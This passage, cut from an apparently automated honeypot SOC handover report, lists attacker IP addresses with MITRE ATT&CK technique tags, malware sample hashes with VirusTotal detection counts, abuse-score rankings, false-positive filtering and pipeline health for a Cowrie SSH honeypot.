| `76.39.119[.]122` | **2** | 2026-05-17 08:44 | 2026-05-17 08:44 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.237.144[.]204` | 1 | 2026-05-17 07:25 | 2026-05-17 07:25 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `111.238.174[.]6` | 1 | 2026-05-17 07:45 | 2026-05-17 07:45 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.127[.]2` | 1 | 2026-05-17 07:27 | 2026-05-17 07:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `163.7.3[.]26` | 1 | 2026-05-17 08:42 | 2026-05-17 08:42 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `167.172.130[.]89` | 1 | 2026-05-17 09:01 | 2026-05-17 09:01 | 8s | 0 | `T1592` | 🟢 LOW |
| `180.76.234[.]93` | 1 | 2026-05-17 07:47 | 2026-05-17 07:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `222.114.27[.]220` | 1 | 2026-05-17 09:12 | 2026-05-17 09:12 | 30s | 0 | `T1592` | 🟢 LOW |
| `43.153.93[.]68` | 1 | 2026-05-17 08:45 | 2026-05-17 08:45 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `46.162.205[.]210` | 1 | 2026-05-17 08:01 | 2026-05-17 08:01 | 12s | 0 | `T1592` | 🟢 LOW |
| `47.251.191[.]203` | 1 | 2026-05-17 07:51 | 2026-05-17 07:51 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.88.193[.]33` | 1 | 2026-05-17 06:58 | 2026-05-17 06:59 | 13s | 0 | `T1592` | 🟢 LOW |
| `60.178.129[.]252` | 1 | 2026-05-17 07:22 | 2026-05-17 07:24 | 120s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]82` | 1 | 2026-05-17 07:36 | 2026-05-17 07:36 | 15s | 0 | `T1592` | 🟢 LOW |
| `75.3.252[.]21` | 1 | 2026-05-17 07:58 | 2026-05-17 07:59 | 30s | 0 | `T1592` | 🟢 LOW |
| `87.106.35[.]227` | 1 | 2026-05-17 07:45 | 2026-05-17 07:45 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `94.1.178[.]66` | 1 | 2026-05-17 07:38 | 2026-05-17 07:38 | 13s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `60.178.129[.]252` | CN | CHINANET-ZJ Ningbo node network | **100** ⚠️ | 2 |
| `43.153.93[.]68` | US | Asia Pacific Network Information Center, Pty. Ltd. | **100** ⚠️ | 6 |
| `66.132.195[.]82` | US | Censys, Inc. | **100** ⚠️ | 47 |
| `208.109.244[.]195` | US | GoDaddy.com, LLC | **100** ⚠️ | 1 |
| `167.172.130[.]89` | US | DigitalOcean, LLC | **100** ⚠️ | 1 |
| `58.20.236[.]52` | CN | CNC Group HuNan JiShou network | **100** ⚠️ | 50 |
| `175.107.31[.]20` | PK | National Telecommunication Corporation | **100** ⚠️ | 2 |
| `137.184.204[.]8` | US | DigitalOcean, LLC | **100** ⚠️ | 1 |
| `218.0.56[.]78` | CN | CHINANET Zhejiang province network | **100** ⚠️ | 50 |
| `222.114.27[.]220` | KR | Korea Telecom | **100** ⚠️ | 3 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 120 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 23 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 16 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 16 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 13 |

---

## 🔕 False Positive Summary (7 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 22 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 659 cases |
| Tool 34  | Credential Extractor        | ✅ 36 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 7 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 35 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 7 filtered (1.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 31 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 23 priority case(s) shown individually · 28 recon entry/entries in table (12 group(s) consolidating 613 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-17T09:50:31Z_
